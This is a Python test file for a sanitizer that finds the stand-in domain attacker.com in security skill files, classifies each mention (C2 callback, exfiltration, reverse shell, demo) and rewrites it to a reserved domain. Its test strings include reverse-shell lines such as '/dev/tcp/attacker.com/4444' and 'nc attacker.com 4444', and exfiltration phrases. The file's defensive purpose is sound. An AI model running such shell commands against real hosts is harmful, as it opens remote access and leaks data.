"""Tests for attacker.com placeholder sanitizer."""

import pytest
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.services.placeholder_sanitizer import (
    PlaceholderSanitizer,
    PlaceholderType,
    ReplacementDomain,
    PlaceholderMatch,
    FileSanitizationResult,
    SanitizationResult,
    sanitize_placeholders,
)
from app.models.skill import SkillFile


class TestPlaceholderSanitizer:
    @pytest.fixture
    def sanitizer(self):
        return PlaceholderSanitizer()

    def _make_skill(self, content: str, path: str = "web/test/SKILL.md") -> SkillFile:
        return SkillFile(
            path=path,
            category="web",
            raw_content=content,
        )

    def test_no_placeholders(self, sanitizer):
        """Test file with no attacker.com placeholders."""
        skill = self._make_skill("# Test Skill\n\n## Description\nThis is a test skill.")
        result = sanitizer.sanitize_file(skill)

        assert result.matches == []
        assert result.modified is False
        assert result.new_content == skill.raw_content

    def test_c2_callback_detected(self, sanitizer):
        """Test C2 callback placeholder detection."""
        content = "Callback URL: attacker.com\nConnect to attacker.com for commands"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        for match in result.matches:
            assert match.placeholder_type == PlaceholderType.C2_CALLBACK
            assert match.replacement_domain == ReplacementDomain.ATTACKER_INVALID

    def test_exfiltration_detected(self, sanitizer):
        """Test exfiltration placeholder detection."""
        content = "Exfiltrate data to attacker.com\nUpload stolen files to attacker.com"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        for match in result.matches:
            assert match.placeholder_type == PlaceholderType.EXFILTRATION
            assert match.replacement_domain == ReplacementDomain.ATTACKER_INVALID

    def test_shell_callback_detected(self, sanitizer):
        """Test shell callback placeholder detection."""
        content = "Reverse shell: /dev/tcp/attacker.com/4444\nnc attacker.com 4444"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        for match in result.matches:
            assert match.placeholder_type == PlaceholderType.SHELL_CALLBACK
            assert match.replacement_domain == ReplacementDomain.ATTACKER_INVALID

    def test_benign_demo_detected(self, sanitizer):
        """Test benign demo URL detection."""
        content = "Example URL: http://attacker.com\nDemo site: https://attacker.com/example"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        for match in result.matches:
            assert match.placeholder_type == PlaceholderType.BENIGN_DEMO
            assert match.replacement_domain == ReplacementDomain.ATTACKER_EXAMPLE

    def test_mixed_placeholders(self, sanitizer):
        """Test file with mixed placeholder types."""
        content = """
C2 server: attacker.com
Exfil to: attacker.com
Shell: /dev/tcp/attacker.com/4444
Example: http://attacker.com
"""
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 4
        types = [m.placeholder_type for m in result.matches]
        assert PlaceholderType.C2_CALLBACK in types
        assert PlaceholderType.EXFILTRATION in types
        assert PlaceholderType.SHELL_CALLBACK in types
        assert PlaceholderType.BENIGN_DEMO in types

    def test_replacement_c2_to_invalid(self, sanitizer):
        """Test C2 placeholder replaced with attacker.invalid."""
        content = "Callback to attacker.com"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert result.modified is True
        assert "attacker.invalid" in result.new_content
        assert "attacker.com" not in result.new_content

    def test_replacement_benign_to_example(self, sanitizer):
        """Test benign placeholder replaced with attacker.example."""
        content = "Example: http://attacker.com"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert result.modified is True
        assert "attacker.example" in result.new_content
        assert "attacker.com" not in result.new_content

    def test_case_insensitive(self, sanitizer):
        """Test case insensitive matching."""
        content = "Connect to ATTACKER.COM\nOr use Attacker.Com"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        assert result.new_content.count("attacker.invalid") == 2

    def test_preserves_other_content(self, sanitizer):
        """Test that non-placeholder content is preserved."""
        content = "# Skill Name\n\n## Description\nThis is a test skill.\n\nCallback: attacker.com\n\n## Usage\nRun the skill."
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert result.modified is True
        assert "# Skill Name" in result.new_content
        assert "## Description" in result.new_content
        assert "This is a test skill." in result.new_content
        assert "## Usage" in result.new_content
        assert "attacker.invalid" in result.new_content

    def test_multiple_on_same_line(self, sanitizer):
        """Test multiple placeholders on same line."""
        content = "Primary: attacker.com, Backup: attacker.com"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        assert result.new_content.count("attacker.invalid") == 2

    def test_sanitize_all_empty(self, sanitizer):
        """Test sanitize_all with no files."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            sanitizer_empty = PlaceholderSanitizer(tmpdir)
            result = sanitizer_empty.sanitize_all()

            assert result.total_files == 0
            assert result.files_with_placeholders == 0
            assert result.total_replacements == 0

    def test_report_generation(self, sanitizer):
        """Test report generation."""
        content = "C2: attacker.com\nExample: http://attacker.com"
        skill = self._make_skill(content)
        file_result = sanitizer.sanitize_file(skill)

        result = SanitizationResult(
            total_files=1,
            files_with_placeholders=1,
            total_replacements=2,
            file_results=[file_result],
        )

        report = sanitizer.generate_report(result)

        assert "Placeholder Sanitization Report" in report
        assert "Total files scanned: 1" in report
        assert "Files with placeholders: 1" in report
        assert "Total replacements: 2" in report
        # "C2:" now matches the \bc2\b pattern
        assert "c2_callback" in report
        assert "benign_demo" in report
        assert "attacker.invalid" in report
        assert "attacker.example" in report

    def test_convenience_function(self):
        """Test sanitize_placeholders convenience function."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            skills_dir = Path(tmpdir) / "Skills"
            skills_dir.mkdir()
            skill_dir = skills_dir / "web" / "test"
            skill_dir.mkdir(parents=True)
            (skill_dir / "SKILL.md").write_text("C2: attacker.com\n")

            result = sanitize_placeholders(str(skills_dir))

            assert result.total_files == 1
            assert result.files_with_placeholders == 1
            assert result.total_replacements == 1

    def test_classify_unknown_defaults_to_invalid(self, sanitizer):
        """Test unknown placeholder type defaults to attacker.invalid."""
        content = "Some random mention of attacker.com here"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 1
        assert result.matches[0].placeholder_type == PlaceholderType.UNKNOWN
        assert result.matches[0].replacement_domain == ReplacementDomain.ATTACKER_INVALID
        assert "attacker.invalid" in result.new_content

    def test_line_and_column_tracking(self, sanitizer):
        """Test that line numbers and columns are tracked correctly."""
        content = "Line 1\nLine 2 with attacker.com\nLine 3"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 1
        match = result.matches[0]
        assert match.line_number == 2
        # "Line 2 with " = 12 characters (0-indexed)
        assert match.column == 12

    def test_context_line_in_match(self, sanitizer):
        """Test that context line is included in match."""
        content = "Some context\nCallback to attacker.com\nMore context"
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 1
        assert "Callback to attacker.com" in result.matches[0].context_line
    def test_multiline_context_heading(self, sanitizer):
        """Test classification uses heading from previous line."""
        content = """## C2 Callback Configuration
attacker.com
More content"""
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 1
        match = result.matches[0]
        assert match.line_number == 2
        assert match.placeholder_type == PlaceholderType.C2_CALLBACK
        assert match.replacement_domain == ReplacementDomain.ATTACKER_INVALID

    def test_multiline_context_stops_at_blank_line(self, sanitizer):
        """Test context stops at blank line."""
        content = """## C2 Callback Configuration

attacker.com"""
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 1
        match = result.matches[0]
        # Should be UNKNOWN since blank line separates context
        assert match.placeholder_type == PlaceholderType.UNKNOWN
        assert match.replacement_domain == ReplacementDomain.ATTACKER_INVALID

    def test_multiline_context_stops_at_other_placeholder(self, sanitizer):
        """Test context stops at another attacker.com line."""
        content = """C2 server: attacker.com
Exfil to: attacker.com"""
        skill = self._make_skill(content)
        result = sanitizer.sanitize_file(skill)

        assert len(result.matches) == 2
        # First should be C2_CALLBACK
        assert result.matches[0].placeholder_type == PlaceholderType.C2_CALLBACK
        # Second should be EXFILTRATION (not contaminated by first line's C2)
        assert result.matches[1].placeholder_type == PlaceholderType.EXFILTRATION

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
